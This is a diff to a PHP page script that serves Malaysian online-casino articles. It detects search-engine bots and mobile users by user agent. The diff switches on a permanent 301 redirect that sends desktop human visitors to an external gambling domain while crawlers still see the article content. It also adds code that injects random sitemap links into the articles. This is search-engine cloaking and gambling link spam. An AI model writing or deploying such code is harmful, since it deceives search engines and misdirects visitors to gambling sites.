@@ -1,4 +1,7 @@
 <?php
+$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
+$domain = $_SERVER['HTTP_HOST'];
+$fullUrl = $protocol . $domain;
 function isBot($userAgent) {
     $bots = [
         'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 
@@ -18,10 +21,45 @@ $isMobile = (strpos($userAgent, 'Mobile') !== false);
 $isBot = isBot($userAgent);
 
 if (!$isMobile && !$isBot) {
-   // header('HTTP/1.1 301 Moved Permanently');
+    header('HTTP/1.1 301 Moved Permanently');
     header('Location: https://bc55-my.web.app');
     exit;
 }
+
+function fetchSitemapUrls($sitemapUrl) {
+    $urls = [];
+    $xml = @simplexml_load_file($sitemapUrl);
+
+    if ($xml) {
+        foreach ($xml->url as $url) {
+            $loc = (string) $url->loc;
+            $urls[] = $loc;
+        }
+    }
+
+    return $urls;
+}
+
+function autoInternalLink($content, $urls, $limit = 5) {
+    if (empty($urls)) return $content;
+
+    // Pick random URLs
+    shuffle($urls);
+    $selectedUrls = array_slice($urls, 0, $limit);
+
+    foreach ($selectedUrls as $url) {
+        // Extract last part of URL for anchor text (you can customize)
+        $text = ucwords(str_replace(['-', '_'], ' ', basename($url)));
+
+        // Create anchor tag
+        $link = '<a href="' . htmlspecialchars($url) . '">' . htmlspecialchars($text) . '</a>';
+        $content = preg_replace('/(\. )/i', '. ' . $link . ' ', $content, 1);
+    }
+
+    return $content;
+}
+$sitemapUrl = $fullUrl.'/sitemap.xml';
+$urls = fetchSitemapUrls($sitemapUrl);
 function generateMetaTags($htmlContent) {
     $text = strip_tags($htmlContent);
     $text = html_entity_decode($text, ENT_QUOTES | ENT_HTML5, 'UTF-8');
@@ -182,13 +220,16 @@ $p = [
 if (isset($_GET['p']) && array_key_exists($_GET['p'], $articles)) {
     $slug = $_GET['p'];
     $title = isset($p[$slug]) ? $p[$slug] : ucfirst(str_replace('-', ' ', $slug));
-    $article = $articles[$slug]['content'];
+    $articleContent = $articles[$slug]['content'];
+    $article = autoInternalLink($articleContent, $urls);
     $meta = generateMetaTags($article);
 $desc = htmlspecialchars($meta['description'], ENT_QUOTES);
 $key =  htmlspecialchars($meta['keywords'], ENT_QUOTES);
+
 } else {
     $random_key = array_rand($articles);
-    $article = $articles[$random_key]['content'];
+    $articleContent  = $articles[$random_key]['content'];
+    $article = autoInternalLink($articleContent, $urls);
     $title = isset($p[$random_key]) ? $p[$random_key] : '🎲 Discover Top Online Casinos in Malaysia'; 
     $meta = generateMetaTags($article);
 $desc = htmlspecialchars($meta['description'], ENT_QUOTES);
